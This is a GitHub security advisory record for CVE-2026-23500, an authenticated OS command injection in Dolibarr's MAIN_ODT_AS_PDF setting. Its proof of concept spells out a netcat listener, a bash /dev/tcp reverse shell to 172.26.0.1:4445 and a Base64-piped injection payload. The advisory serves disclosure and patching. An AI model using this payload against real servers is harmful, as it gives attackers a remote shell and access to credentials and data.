body_excerpt: {"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/185241918?v=4", "events_url": "https://api.github.com/users/lukasz-rybak/events{/privacy}", "followers_url": "https://api.github.com/users/lukasz-rybak/followers", "following_url": "https://api.github.com/users/lukasz-rybak/following{/other_user}", "gists_url": "https://api.github.com/users/lukasz-rybak/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/lukasz-rybak", "id": 185241918, "login": "lukasz-rybak", "node_id": "U_kgDOCwqRPg", "organizations_url": "https://api.github.com/users/lukasz-rybak/orgs", "received_events_url": "https://api.github.com/users/lukasz-rybak/received_events", "repos_url": "https://api.github.com/users/lukasz-rybak/repos", "site_admin": false, "starred_url": "https://api.github.com/users/lukasz-rybak/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lukasz-rybak/subscriptions", "type": "User", "url": "https://api.github.com/users/lukasz-rybak", "user_view_type": "public"}}], "cve_id": "CVE-2026-23500", "cvss": {"score": 9.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 9.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"}, "cvss_v4": {"score": 9.4, "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"}}, "cwes": [{"cwe_id": "CWE-78", "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"}], "description": "### Summary An authenticated administrator can execute arbitrary operating system commands by injecting a malicious payload into the `MAIN_ODT_AS_PDF` configuration constant. This vulnerability exists because the application fails to properly validate or escape the command path before passing it to the `exec()` function in the ODT to PDF conversion process. ### Details The vulnerability is located in `htdocs/includes/odtphp/odf.php`. When the system tries to convert an ODT document to PDF (e.g., in Proposals, Invoices), it constructs a shell command using the `MAIN_ODT_AS_PDF` global setting. Code snippet (`htdocs/includes/odtphp/odf.php`, approx line 930): ```php $command = getDolGlobalString('MAIN_ODT_AS_PDF').' '.escapeshellcmd($name); // ... exec($command, $output_arr, $retval); ``` While the filename `$name` is sanitized using `escapeshellcmd()`, the configuration variable `MAIN_ODT_AS_PDF` is retrieved directly from the database and concatenated at the beginning of the string. An attacker with administrative privileges can set this variable to include a command separator (like `;`) followed by arbitrary commands. ### PoC **Prerequisites:** 1. Login as an Administrator. 2. Ensure the "Commercial Proposals" module is enabled and "ODT templates" are activated in its setup. **Steps to reproduce (Reverse Shell):** 1. Start a netcat listener on the attacker's machine (IP: `172.26.0.1`, Port: `4445`): ```bash nc -lvnp 4445 ``` 2. Prepare the payload. To avoid issues with special characters (like `&` or `>`) being escaped by the web application or shell, encode the reverse shell command in Base64: ```bash # Command: bash -c 'bash -i >& /dev/tcp/172.26.0.1/4445 0>&1' echo "bash -c 'bash -i >& /dev/tcp/172.26.0.1/4445 0>&1'" | base64 # Output: YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjYuMC4xLzQ0NDUgMD4mMScK ``` 3. Navigate to **Home -> Setup -> Other Setup**. 4. Add or modify the constant `MAIN_ODT_AS_PDF` with the following injection payload: ```bash jodconverter; echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjYuMC4xLzQ0NDUgMD4mMScK | base64 -d | bash ``` *(Explanation: `jodconverter` satisfies the initial check, `;` acts as a command separator, and the pipeline decodes and executes the Base64 payload).* 5. Navigate to **Commerce -> New proposal**, create a draft, select an ODT template (e.g., `generic_proposal_odt`), and click **Generate**. 6. Check the netcat listener. A connection will be established, granting a shell on the server: ### Impact **Remote Code Execution (RCE).** An attacker who gains access to an administrator account (or a malicious administrator) can execute arbitrary commands on the underlying server with the privileges of the web server user (typically `www-data`). This allows for: - Reading sensitive configuration files (database credentials). - Modifying application code. - Full system compromise depending on server configuration (e.g., docker escape, pivoting). --- ### Credits Reported by Łukasz Rybak", "epss": {"percentage": 0.00922, "percentile": 0.55629}, "ghsa_id": "GHSA-w5j3-8fcr-h87w", "github_reviewed_at": "2026-04-17T21:24:48Z", "html_url": "https://github.com/advisories/GHSA-w5j3-8fcr-h87w", "identifiers": [{"type": "GHSA", "value": "GHSA-w5j3-8fcr-h87w"}, {"type": "CVE", "value": "CVE-2026-23500"}], "nvd_published_at": "2026-04-17T21:16:31Z", "published_at": "2026-04-17T21:24:48Z", "references": ["https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-w5j3-8fcr-h87w", "https://nvd.nist.gov/vuln/detail/CVE-2026-23500", "https://github.com/Dolibarr/dolibarr/releases/tag/23.0.0", "https://github.com/advisories/GHSA-w5j3-8fcr-h87w"], "repository_advisory_url": "https://api.github.com/repos/Dolibarr/dolibarr/security-advisories/GHSA-w5j3-8fcr-h87w", "severity": "critical", "source_code_location": "https://github.com/Dolibarr/dolibarr", "summary": "Dolibarr: OS Command Injection (RCE) via MAIN_ODT_AS_PDF configuration", "type": "reviewed", "updated_at": "2026-05-06T22:23:05Z", "url": "https://api.github.com/advisories/GHSA-w5j3-8fcr-h87w", "vulnerabilities": [{"first_patched_version": null, "package": {"ecosystem": "composer", "name": "dolibarr/dolibarr"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 22.0.4"}], "withdrawn_at": null}

title: Dolibarr: OS Command Injection (RCE) via MAIN_ODT_AS_PDF configuration
